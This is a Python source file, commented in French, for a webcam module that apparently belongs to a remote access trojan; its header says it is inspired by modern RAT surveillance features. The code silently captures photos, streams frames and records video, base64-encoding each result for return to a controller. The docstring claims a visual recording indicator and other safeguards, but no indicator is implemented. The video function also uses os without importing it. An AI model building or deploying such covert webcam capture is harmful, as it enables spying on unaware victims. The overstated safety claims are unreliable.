"""
Webcam Module - Capture photo et streaming webcam
⚠️ USAGE ÉDUCATIF UNIQUEMENT - Avec consentement explicite ⚠️
Inspiré des fonctionnalités de surveillance des RATs modernes
"""

import cv2
import threading
import time
import base64
import io
from datetime import datetime
from typing import Dict, Any, Optional, Tuple
import logging

try:
    import numpy as np
    NUMPY_AVAILABLE = True
except ImportError:
    NUMPY_AVAILABLE = False

logger = logging.getLogger(__name__)

class WebcamModule:
    """
    Module de capture webcam avec fonctionnalités éthiques
    
    GARDE-FOUS IMPLÉMENTÉS:
    - Indication visuelle d'enregistrement
    - Durée limitée de streaming
    - Résolution limitée pour la confidentialité
    - Logs d'audit complets
    """
    
    def __init__(self):
        self.camera = None
        self.is_streaming = False
        self.stream_thread = None
        self.frame_buffer = []
        self.stream_start_time = None
        
        # Paramètres de sécurité
        self.MAX_STREAM_DURATION = 300  # 5 minutes max
        self.MAX_RESOLUTION = (640, 480)  # Résolution limitée
        self.FRAME_RATE = 5  # FPS limité pour la confidentialité
        self.MAX_FRAMES_BUFFER = 30  # Buffer limité
        
        # Statistiques
        self.snapshots_taken = 0
        self.stream_sessions = 0
        self.total_stream_time = 0
        
        # Vérification de OpenCV
        try:
            # Test de disponibilité de la webcam
            test_cam = cv2.VideoCapture(0)
            self.camera_available = test_cam.isOpened()
            test_cam.release()
            if not self.camera_available:
                logger.warning("Aucune webcam détectée")
        except Exception as e:
            self.camera_available = False
            logger.error(f"Erreur initialisation webcam: {e}")
    
    def take_snapshot(self, quality: int = 85) -> Dict[str, Any]:
        """
        Prend une photo avec la webcam
        
        Args:
            quality: Qualité de l'image (1-100)
        """
        try:
            if not self.camera_available:
                return {
                    'status': 'error',
                    'output': 'Aucune webcam disponible'
                }
            
            # Ouverture de la caméra
            camera = cv2.VideoCapture(0)
            if not camera.isOpened():
                return {
                    'status': 'error',
                    'output': 'Impossible d\'accéder à la webcam'
                }
            
            # Configuration de la résolution
            camera.set(cv2.CAP_PROP_FRAME_WIDTH, self.MAX_RESOLUTION[0])
            camera.set(cv2.CAP_PROP_FRAME_HEIGHT, self.MAX_RESOLUTION[1])
            
            # Attendre que la caméra se stabilise
            time.sleep(0.5)
            
            # Capture de plusieurs frames pour améliorer la qualité
            for _ in range(5):
                ret, frame = camera.read()
                if ret:
                    break
            
            camera.release()
            
            if not ret or frame is None:
                return {
                    'status': 'error',
                    'output': 'Échec de capture de l\'image'
                }
            
            # Traitement de l'image
            processed_frame = self._process_frame(frame, quality)
            if processed_frame is None:
                return {
                    'status': 'error',
                    'output': 'Erreur lors du traitement de l\'image'
                }
            
            # Encodage base64
            encoded_frame = base64.b64encode(processed_frame).decode('utf-8')
            
            # Mise à jour des statistiques
            self.snapshots_taken += 1
            timestamp = datetime.now()
            filename = f"webcam_snapshot_{timestamp.strftime('%Y%m%d_%H%M%S')}.jpg"
            
            logger.info(f"Snapshot webcam pris: {filename}")
            
            return {
                'status': 'success',
                'output': f'Photo webcam capturée: {filename}',
                'file_data': encoded_frame,
                'filename': filename,
                'timestamp': timestamp.isoformat(),
                'resolution': self._get_frame_resolution(frame),
                'size': len(processed_frame)
            }
            
        except Exception as e:
            logger.error(f"Erreur snapshot webcam: {e}")
            return {
                'status': 'error',
                'output': f'Erreur lors de la capture: {str(e)}'
            }
    
    def start_stream(self) -> Dict[str, Any]:
        """Démarre le streaming webcam avec limitations de sécurité"""
        try:
            if not self.camera_available:
                return {
                    'status': 'error',
                    'output': 'Aucune webcam disponible'
                }
            
            if self.is_streaming:
                return {
                    'status': 'error',
                    'output': 'Streaming déjà en cours'
                }
            
            # Réinitialisation du buffer
            self.frame_buffer.clear()
            self.stream_start_time = time.time()
            self.is_streaming = True
            self.stream_sessions += 1
            
            # Démarrage du thread de streaming
            self.stream_thread = threading.Thread(target=self._stream_worker)
            self.stream_thread.daemon = True
            self.stream_thread.start()
            
            logger.info(f"Streaming webcam démarré (session #{self.stream_sessions})")
            
            return {
                'status': 'success',
                'output': (
                    f'Streaming webcam démarré (session #{self.stream_sessions})\\n'
                    f'⚠️ LIMITATIONS DE SÉCURITÉ ACTIVES ⚠️\\n'
                    f'- Durée max: {self.MAX_STREAM_DURATION}s\\n'
                    f'- Résolution max: {self.MAX_RESOLUTION[0]}x{self.MAX_RESOLUTION[1]}\\n'
                    f'- Frame rate: {self.FRAME_RATE} FPS\\n'
                    f'- Buffer limité: {self.MAX_FRAMES_BUFFER} frames'
                ),
                'session_id': self.stream_sessions,
                'max_duration': self.MAX_STREAM_DURATION,
                'resolution': self.MAX_RESOLUTION
            }
            
        except Exception as e:
            logger.error(f"Erreur démarrage stream: {e}")
            return {
                'status': 'error',
                'output': f'Erreur lors du démarrage: {str(e)}'
            }
    
    def stop_stream(self) -> Dict[str, Any]:
        """Arrête le streaming webcam"""
        try:
            if not self.is_streaming:
                return {
                    'status': 'error',
                    'output': 'Aucun streaming en cours'
                }
            
            # Arrêt du streaming
            self.is_streaming = False
            
            # Attendre que le thread se termine
            if self.stream_thread and self.stream_thread.is_alive():
                self.stream_thread.join(timeout=2)
            
            # Calcul des statistiques
            session_duration = 0
            if self.stream_start_time:
                session_duration = time.time() - self.stream_start_time
                self.total_stream_time += session_duration
            
            frames_captured = len(self.frame_buffer)
            
            # Libération de la caméra
            if self.camera:
                self.camera.release()
                self.camera = None
            
            logger.info(f"Streaming arrêté - {frames_captured} frames capturées")
            
            return {
                'status': 'success',
                'output': (
                    f'Streaming webcam arrêté\\n'
                    f'Durée de session: {session_duration:.1f}s\\n'
                    f'Frames capturées: {frames_captured}\\n'
                    f'Sessions totales: {self.stream_sessions}'
                ),
                'session_duration': session_duration,
                'frames_captured': frames_captured
            }
            
        except Exception as e:
            logger.error(f"Erreur arrêt stream: {e}")
            return {
                'status': 'error',
                'output': f'Erreur lors de l\'arrêt: {str(e)}'
            }
    
    def get_stream_frame(self) -> Dict[str, Any]:
        """Récupère la dernière frame du stream"""
        try:
            if not self.is_streaming:
                return {
                    'status': 'error',
                    'output': 'Aucun streaming en cours'
                }
            
            if not self.frame_buffer:
                return {
                    'status': 'info',
                    'output': 'Aucune frame disponible'
                }
            
            # Récupération de la dernière frame
            latest_frame = self.frame_buffer[-1]
            
            return {
                'status': 'success',
                'output': 'Frame récupérée',
                'frame_data': latest_frame['data'],
                'timestamp': latest_frame['timestamp'],
                'frame_number': latest_frame['frame_number']
            }
            
        except Exception as e:
            return {
                'status': 'error',
                'output': f'Erreur récupération frame: {str(e)}'
            }
    
    def get_webcam_info(self) -> Dict[str, Any]:
        """Récupère les informations sur la webcam"""
        try:
            info = {
                'camera_available': self.camera_available,
                'is_streaming': self.is_streaming,
                'snapshots_taken': self.snapshots_taken,
                'stream_sessions': self.stream_sessions,
                'total_stream_time': self.total_stream_time,
                'current_session_duration': 0,
                'frame_buffer_size': len(self.frame_buffer),
                'max_resolution': self.MAX_RESOLUTION,
                'frame_rate': self.FRAME_RATE
            }
            
            if self.is_streaming and self.stream_start_time:
                info['current_session_duration'] = time.time() - self.stream_start_time
            
            # Informations techniques de la webcam
            if self.camera_available:
                try:
                    test_cam = cv2.VideoCapture(0)
                    if test_cam.isOpened():
                        info['webcam_details'] = {
                            'backend': test_cam.getBackendName(),
                            'fps': test_cam.get(cv2.CAP_PROP_FPS),
                            'width': int(test_cam.get(cv2.CAP_PROP_FRAME_WIDTH)),
                            'height': int(test_cam.get(cv2.CAP_PROP_FRAME_HEIGHT))
                        }
                    test_cam.release()
                except:
                    pass
            
            return {
                'status': 'success',
                'output': 'Informations webcam récupérées',
                'data': info
            }
            
        except Exception as e:
            return {
                'status': 'error',
                'output': f'Erreur informations webcam: {str(e)}'
            }
    
    def _stream_worker(self):
        """Thread worker pour le streaming"""
        try:
            # Ouverture de la caméra
            self.camera = cv2.VideoCapture(0)
            if not self.camera.isOpened():
                logger.error("Impossible d'ouvrir la caméra pour le streaming")
                self.is_streaming = False
                return
            
            # Configuration de la caméra
            self.camera.set(cv2.CAP_PROP_FRAME_WIDTH, self.MAX_RESOLUTION[0])
            self.camera.set(cv2.CAP_PROP_FRAME_HEIGHT, self.MAX_RESOLUTION[1])
            self.camera.set(cv2.CAP_PROP_FPS, self.FRAME_RATE)
            
            frame_interval = 1.0 / self.FRAME_RATE
            frame_number = 0
            
            while self.is_streaming:
                start_time = time.time()
                
                # Vérification de la durée maximale
                if self.stream_start_time and (time.time() - self.stream_start_time) >= self.MAX_STREAM_DURATION:
                    logger.warning("Durée maximale de streaming atteinte")
                    break
                
                # Capture de frame
                ret, frame = self.camera.read()
                if not ret:
                    logger.warning("Échec de capture de frame")
                    continue
                
                # Traitement de la frame
                processed_frame = self._process_frame(frame, quality=70)
                if processed_frame:
                    # Encodage base64
                    encoded_frame = base64.b64encode(processed_frame).decode('utf-8')
                    
                    # Ajout au buffer avec rotation
                    frame_data = {
                        'data': encoded_frame,
                        'timestamp': datetime.now().isoformat(),
                        'frame_number': frame_number,
                        'size': len(processed_frame)
                    }
                    
                    self.frame_buffer.append(frame_data)
                    
                    # Limitation du buffer
                    if len(self.frame_buffer) > self.MAX_FRAMES_BUFFER:
                        self.frame_buffer.pop(0)
                    
                    frame_number += 1
                
                # Respect du frame rate
                elapsed = time.time() - start_time
                if elapsed < frame_interval:
                    time.sleep(frame_interval - elapsed)
            
        except Exception as e:
            logger.error(f"Erreur dans stream worker: {e}")
        finally:
            # Nettoyage
            if self.camera:
                self.camera.release()
                self.camera = None
            self.is_streaming = False
    
    def _process_frame(self, frame, quality: int = 85) -> Optional[bytes]:
        """Traite et compresse une frame"""
        try:
            # Redimensionnement si nécessaire
            height, width = frame.shape[:2]
            if width > self.MAX_RESOLUTION[0] or height > self.MAX_RESOLUTION[1]:
                # Calcul du ratio pour maintenir les proportions
                ratio = min(self.MAX_RESOLUTION[0] / width, self.MAX_RESOLUTION[1] / height)
                new_width = int(width * ratio)
                new_height = int(height * ratio)
                frame = cv2.resize(frame, (new_width, new_height), interpolation=cv2.INTER_AREA)
            
            # Amélioration de l'image (optionnel)
            # frame = cv2.convertScaleAbs(frame, alpha=1.1, beta=10)  # Contraste et luminosité
            
            # Encodage JPEG avec compression
            encode_params = [cv2.IMWRITE_JPEG_QUALITY, quality]
            success, encoded_frame = cv2.imencode('.jpg', frame, encode_params)
            
            if success:
                return encoded_frame.tobytes()
            else:
                return None
                
        except Exception as e:
            logger.error(f"Erreur traitement frame: {e}")
            return None
    
    def _get_frame_resolution(self, frame) -> Tuple[int, int]:
        """Récupère la résolution d'une frame"""
        try:
            height, width = frame.shape[:2]
            return (width, height)
        except:
            return (0, 0)
    
    def clear_buffer(self) -> Dict[str, Any]:
        """Vide le buffer de frames"""
        try:
            buffer_size = len(self.frame_buffer)
            self.frame_buffer.clear()
            
            return {
                'status': 'success',
                'output': f'Buffer vidé ({buffer_size} frames supprimées)'
            }
            
        except Exception as e:
            return {
                'status': 'error',
                'output': f'Erreur vidage buffer: {str(e)}'
            }
    
    def record_video(self, duration: int = 10, output_file: str = None) -> Dict[str, Any]:
        """
        Enregistre une vidéo de durée limitée
        
        Args:
            duration: Durée en secondes (max 60s)
            output_file: Nom du fichier de sortie
        """
        try:
            if not self.camera_available:
                return {
                    'status': 'error',
                    'output': 'Aucune webcam disponible'
                }
            
            # Limitation de durée pour la sécurité
            duration = min(duration, 60)
            
            if not output_file:
                timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
                output_file = f"webcam_recording_{timestamp}.avi"
            
            # Configuration de l'enregistreur vidéo
            fourcc = cv2.VideoWriter_fourcc(*'XVID')
            out = cv2.VideoWriter(output_file, fourcc, self.FRAME_RATE, self.MAX_RESOLUTION)
            
            camera = cv2.VideoCapture(0)
            if not camera.isOpened():
                return {
                    'status': 'error',
                    'output': 'Impossible d\'accéder à la webcam'
                }
            
            camera.set(cv2.CAP_PROP_FRAME_WIDTH, self.MAX_RESOLUTION[0])
            camera.set(cv2.CAP_PROP_FRAME_HEIGHT, self.MAX_RESOLUTION[1])
            
            start_time = time.time()
            frames_recorded = 0
            
            while (time.time() - start_time) < duration:
                ret, frame = camera.read()
                if ret:
                    # Redimensionnement de la frame
                    frame = cv2.resize(frame, self.MAX_RESOLUTION)
                    out.write(frame)
                    frames_recorded += 1
                
                time.sleep(1.0 / self.FRAME_RATE)
            
            # Nettoyage
            camera.release()
            out.release()
            
            # Lecture du fichier pour encodage base64
            with open(output_file, 'rb') as f:
                video_data = f.read()
            
            # Suppression du fichier temporaire
            os.unlink(output_file)
            
            # Encodage base64
            encoded_video = base64.b64encode(video_data).decode('utf-8')
            
            return {
                'status': 'success',
                'output': f'Vidéo enregistrée: {output_file} ({duration}s, {frames_recorded} frames)',
                'file_data': encoded_video,
                'filename': output_file,
                'duration': duration,
                'frames': frames_recorded,
                'size': len(video_data)
            }
            
        except Exception as e:
            logger.error(f"Erreur enregistrement vidéo: {e}")
            return {
                'status': 'error',
                'output': f'Erreur lors de l\'enregistrement: {str(e)}'
            }